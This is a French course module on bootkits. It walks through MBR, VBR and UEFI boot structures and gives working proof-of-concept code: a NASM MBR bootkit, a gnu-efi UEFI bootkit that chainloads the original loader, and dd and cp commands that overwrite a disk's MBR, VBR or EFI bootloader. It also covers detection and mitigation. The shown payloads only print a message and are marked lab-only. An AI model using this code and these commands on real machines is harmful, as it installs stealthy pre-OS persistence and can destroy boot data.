# Module A09 : Bootkit Concepts - MBR, VBR et UEFI Bootkits

## Objectifs pédagogiques

À la fin de ce module, tu seras capable de :
- Comprendre les différents types de bootkits (MBR, VBR, UEFI)
- Analyser le processus de boot et identifier les points d'infection
- Implémenter un bootkit MBR basique en C et assembleur
- Détecter et éradiquer les bootkits

## Prérequis

Avant de commencer ce module, assure-toi de maîtriser :
- Les bases du langage C et assembleur x86/x86-64
- L'architecture UEFI (Module A06)
- Secure Boot (Module A07) et SPI Flash (Module A08)
- Les structures de disque (MBR, GPT)

## Introduction

### Qu'est-ce qu'un bootkit ?

Un **bootkit** est un malware qui infecte le processus de démarrage de l'ordinateur. Il s'exécute AVANT le système d'exploitation, ce qui le rend extrêmement discret et persistant.

**Analogie :** Imagine un vigile corrompu à l'entrée d'un bâtiment. Il laisse passer tous les autres vigiles (antivirus) sans qu'ils sachent qu'il est compromis. Le bootkit, c'est ce vigile corrompu qui contrôle tout dès le départ.

## Concepts fondamentaux

### Types de bootkits

```
┌──────────────────────────────────────────────────────┐
│          Évolution des bootkits                      │
└──────────────────────────────────────────────────────┘

1. MBR Bootkit (2000s)
   ├─> Infecte le Master Boot Record (secteur 0)
   ├─> 512 bytes disponibles
   └─> Bypas BIOS legacy

2. VBR Bootkit (2005+)
   ├─> Infecte le Volume Boot Record
   ├─> Plus d'espace que MBR
   └─> Cible une partition spécifique

3. UEFI Bootkit (2015+)
   ├─> Infecte le firmware UEFI ou ESP
   ├─> Contourne Secure Boot (si exploit)
   └─> Persistance ultime
```

### MBR Bootkit - Le classique

Le MBR (Master Boot Record) est le premier secteur du disque (secteur 0, 512 bytes). Le BIOS legacy le charge en mémoire à l'adresse **0x7C00** et l'exécute en **mode réel 16-bit**.

**Structure MBR normale :**
```
┌────────────────────────────────────────────────────────┐
│             Structure du MBR (512 bytes)               │
└────────────────────────────────────────────────────────┘

Offset  │ Taille │ Description
────────┼────────┼─────────────────────────────────────
0x000   │ 446    │ Bootstrap code (code de démarrage)
0x1BE   │ 16     │ Partition Entry #1
0x1CE   │ 16     │ Partition Entry #2
0x1DE   │ 16     │ Partition Entry #3
0x1EE   │ 16     │ Partition Entry #4
0x1FE   │ 2      │ Signature magique : 0x55 0xAA
        │        │ (doit être présente pour boot valide)
```

**Structure d'une entrée de partition (16 bytes) :**
```
Offset │ Taille │ Description
───────┼────────┼────────────────────────────
0x00   │ 1      │ Boot flag (0x80 = bootable, 0x00 = non)
0x01   │ 3      │ CHS start address (obsolète)
0x04   │ 1      │ Partition type (0x83 = Linux, 0x07 = NTFS, etc.)
0x05   │ 3      │ CHS end address
0x08   │ 4      │ LBA start (offset en secteurs)
0x0C   │ 4      │ Nombre de secteurs
```

---

## Partie 2 : Infection MBR - Technique classique

### Stratégie d'infection

**Plan d'attaque :**

```
┌────────────────────────────────────────────────────────┐
│         Processus d'infection MBR                      │
└────────────────────────────────────────────────────────┘

1. Lire le MBR original (secteur 0)
   └─> dd if=/dev/sda of=mbr_original.bin bs=512 count=1

2. Sauvegarder le MBR original ailleurs
   └─> Écrire dans un secteur non utilisé (ex: secteur 62)
   └─> dd if=mbr_original.bin of=/dev/sda bs=512 seek=62 count=1

3. Créer le bootkit (code assembleur 16-bit)
   └─> Limité à ~440 bytes (car table partitions à 0x1BE)

4. Injecter le bootkit dans le MBR
   └─> Remplacer le bootstrap code par le bootkit
   └─> Garder la table de partitions intacte !

5. Au prochain boot :
   BIOS → Charge secteur 0 (bootkit) → Bootkit s'exécute
         → Bootkit charge MBR original (secteur 62)
         → Boot normal continue
```

**⚠ Points critiques :**

- Ne **JAMAIS** écraser la table de partitions (offset 0x1BE-0x1FD)
- Ne **JAMAIS** oublier la signature 0x55AA à la fin
- Le bootkit doit charger le MBR original pour ne pas casser le boot

---

### Code assembleur d'un MBR bootkit basique

**Bootkit MBR minimaliste (x86 16-bit) :**

```asm
; MBR Bootkit - Proof of Concept
; Assembleur NASM (16-bit real mode)
; Compile : nasm -f bin -o bootkit.bin bootkit.asm

[BITS 16]
[ORG 0x7C00]  ; BIOS charge le MBR à 0x7C00

start:
    ; Désactiver les interruptions
    cli

    ; Configurer les segments
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00  ; Stack juste avant le MBR

    ; Réactiver les interruptions
    sti

    ; Afficher un message pour prouver l'exécution
    mov si, msg_infected
    call print_string

    ; Charger le MBR original (sauvegardé au secteur 62)
    mov ah, 0x02      ; INT 13h, fonction 02h = Read Sectors
    mov al, 1         ; Nombre de secteurs à lire
    mov ch, 0         ; Cylindre 0
    mov cl, 62        ; Secteur 62 (où on a sauvé l'original)
    mov dh, 0         ; Tête 0
    mov dl, 0x80      ; Disque 0 (premier HDD)
    mov bx, 0x7C00    ; Destination : écraser notre bootkit en mémoire
    int 0x13          ; Appel BIOS

    jc error          ; Si erreur (carry flag set)

    ; Sauter vers le MBR original (maintenant chargé à 0x7C00)
    jmp 0x0000:0x7C00

error:
    mov si, msg_error
    call print_string
    cli
    hlt

; Fonction pour afficher une string (terminée par 0)
print_string:
    mov ah, 0x0E      ; INT 10h, fonction 0Eh = Teletype output
.loop:
    lodsb             ; Charge [DS:SI] dans AL, incrémente SI
    test al, al       ; Test si AL == 0 (fin de string)
    jz .done
    int 0x10          ; Affiche le caractère
    jmp .loop
.done:
    ret

msg_infected: db 'BOOTKIT ACTIVE', 13, 10, 0
msg_error:    db 'ERROR LOADING ORIGINAL MBR', 13, 10, 0

; Padding jusqu'à la signature (512 - 2 bytes de signature)
times 510 - ($ - $$) db 0

; Signature MBR obligatoire
dw 0xAA55
```

**Compilation et test :**

```bash
# Compiler avec NASM
nasm -f bin -o bootkit.bin bootkit.asm

# Vérifier la taille (doit être exactement 512 bytes)
ls -lh bootkit.bin

# Tester dans QEMU (sans risquer le vrai disque)
qemu-system-x86_64 -drive file=bootkit.bin,format=raw
```

---

### Installation du bootkit sur un vrai disque (LAB UNIQUEMENT)

**⚠ ATTENTION : CECI VA DÉTRUIRE LE MBR DU DISQUE !**

**Procédure pour un lab/VM :**

```bash
# 1. Sauvegarder le MBR original
sudo dd if=/dev/sda of=mbr_backup.bin bs=512 count=1

# 2. Extraire la table de partitions (offset 0x1BE à 0x1FD)
dd if=mbr_backup.bin of=partition_table.bin bs=1 skip=446 count=66

# 3. Créer le nouveau MBR avec le bootkit
cat bootkit.bin > new_mbr.bin
# Remplacer les derniers 66 bytes par la table de partitions originale
dd if=partition_table.bin of=new_mbr.bin bs=1 seek=446 conv=notrunc

# 4. Sauvegarder le MBR original dans un secteur non utilisé
sudo dd if=mbr_backup.bin of=/dev/sda bs=512 seek=62 count=1

# 5. Installer le bootkit
sudo dd if=new_mbr.bin of=/dev/sda bs=512 count=1

# 6. Rebooter
sudo reboot
# → Au boot, "BOOTKIT ACTIVE" s'affichera avant le boot normal
```

**Restaurer le MBR original :**

```bash
sudo dd if=mbr_backup.bin of=/dev/sda bs=512 count=1
```

---

## Partie 3 : VBR Bootkit - Infecter le Volume Boot Record

### Différence MBR vs VBR

| Aspect | MBR | VBR |
|--------|-----|-----|
| **Position** | Secteur 0 du disque | Premier secteur d'une partition |
| **Taille** | 512 bytes | 512 bytes (FAT) ou 8192 bytes (NTFS) |
| **Chargé par** | BIOS | MBR bootloader |
| **Espace code** | ~440 bytes | Plus d'espace disponible |
| **Complexité** | Limité | Peut être plus sophistiqué |

**VBR Windows (NTFS) :**

```
┌────────────────────────────────────────────────────────┐
│          Structure VBR NTFS (secteur 0 partition)      │
└────────────────────────────────────────────────────────┘

Offset  │ Taille │ Description
────────┼────────┼─────────────────────────────
0x000   │ 3      │ JMP instruction vers boot code
0x003   │ 8      │ OEM ID ("NTFS    ")
0x00B   │ 25     │ BIOS Parameter Block (BPB)
0x024   │ 48     │ Extended BPB (NTFS specific)
0x054   │ 426    │ Bootstrap code
0x1FE   │ 2      │ Signature 0x55AA
```

**Infection VBR :**

Le VBR a plus d'espace que le MBR (~426 bytes de code), ce qui permet des bootkits plus sophistiqués.

**Exemple d'attaque :**

```bash
# Lire le VBR de la partition 1
sudo dd if=/dev/sda1 of=vbr_original.bin bs=512 count=1

# Modifier le bootstrap code
# (même logique que MBR : sauvegarder l'original, injecter le bootkit)

# Injecter le VBR modifié
sudo dd if=vbr_infected.bin of=/dev/sda1 bs=512 count=1
```

---

## Partie 4 : UEFI Bootkit - L'évolution moderne

### ESP (EFI System Partition)

Sur les systèmes UEFI, le boot se fait via l'**ESP**, une partition FAT32 montée sur `/boot/efi`.

**Structure typique :**

```
/boot/efi/
├─ EFI/
   ├─ BOOT/
   │  └─ BOOTX64.EFI    ← Bootloader par défaut
   ├─ ubuntu/
   │  ├─ grubx64.efi
   │  └─ shimx64.efi
   └─ Microsoft/
      └─ Boot/
         └─ bootmgfw.efi
```

**Infection UEFI :**

```
┌────────────────────────────────────────────────────────┐
│         Stratégie d'infection UEFI Bootkit             │
└────────────────────────────────────────────────────────┘

1. Monter l'ESP
   └─> mount /dev/sda1 /mnt/efi

2. Sauvegarder le bootloader original
   └─> cp /mnt/efi/EFI/BOOT/BOOTX64.EFI /mnt/efi/BOOTX64.ORIGINAL

3. Remplacer par le bootkit UEFI
   └─> cp bootkit.efi /mnt/efi/EFI/BOOT/BOOTX64.EFI

4. Au boot :
   UEFI Firmware → Charge BOOTX64.EFI (bootkit)
                 → Bootkit s'exécute (pré-OS)
                 → Bootkit charge BOOTX64.ORIGINAL
                 → Boot normal continue
```

**Code UEFI bootkit basique :**

```c
#include <efi.h>
#include <efilib.h>

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    InitializeLib(ImageHandle, SystemTable);

    // Afficher un message de preuve
    Print(L"[UEFI BOOTKIT] Executing malicious code...\n");

    // Hook un protocol (exemple : keyboard input)
    // ... (code avancé)

    // Charger le bootloader original
    EFI_DEVICE_PATH *OriginalBootloader = FileDevicePath(ImageHandle, L"\\EFI\\BOOT\\BOOTX64.ORIGINAL");

    EFI_HANDLE LoadedImage;
    EFI_STATUS Status = uefi_call_wrapper(
        SystemTable->BootServices->LoadImage,
        6,
        FALSE,
        ImageHandle,
        OriginalBootloader,
        NULL,
        0,
        &LoadedImage
    );

    if (Status == EFI_SUCCESS) {
        uefi_call_wrapper(SystemTable->BootServices->StartImage, 3, LoadedImage, NULL, NULL);
    }

    return EFI_SUCCESS;
}
```

**Compilation :**

```bash
# Voir module A07 pour la compilation UEFI complète
gcc -I/usr/include/efi -I/usr/include/efi/x86_64 \
    -fno-stack-protector -fpic -fshort-wchar -mno-red-zone \
    -c bootkit.c -o bootkit.o

ld -nostdlib -znocombreloc -T /usr/lib/elf_x86_64_efi.lds -shared \
   -Bsymbolic bootkit.o -o bootkit.so -lefi -lgnuefi

objcopy -j .text -j .sdata -j .data -j .dynamic -j .dynsym -j .rel \
        -j .rela -j .reloc --target=efi-app-x86_64 bootkit.so bootkit.efi
```

Voir [exercice.md](exercice.md) pour un PoC complet d'infection UEFI.

## Application offensive

### Persistance maximale

Les bootkits offrent :
- Exécution pré-OS (avant antivirus)
- Survie au formatage (si UEFI firmware)
- Contrôle total du boot (hook kernel)

### Détection et mitigation

**Détection :**
```bash
# Dumper le MBR
dd if=/dev/sda of=mbr.bin bs=512 count=1

# Analyser
xxd mbr.bin | head -n 30

# Vérifier la signature
xxd -s 510 -l 2 mbr.bin
# Doit afficher: 55 AA
```

**Protection :**
- Secure Boot + TPM (Measured Boot)
- UEFI avec Boot Guard
- Monitoring de l'intégrité du MBR/ESP

## Résumé

- Les bootkits infectent le processus de boot (MBR, VBR, UEFI)
- MBR bootkit = 512 bytes, legacy BIOS
- UEFI bootkit = DXE injection, firmware-level
- Persistance maximale mais détection possible via TPM
- Secure Boot + Boot Guard = meilleure défense

## Ressources complémentaires

- **Bootkits Analysis** : https://www.welivesecurity.com/bootkits/
- **MBR Structure** : https://wiki.osdev.org/MBR
- **TDL4 Bootkit** : https://securelist.com/tdl4-top-bot/32873/
- **BlackLotus UEFI Bootkit** : https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit/

---

**Module suivant** : [SMM Basics](../05-SMM-Basics/)
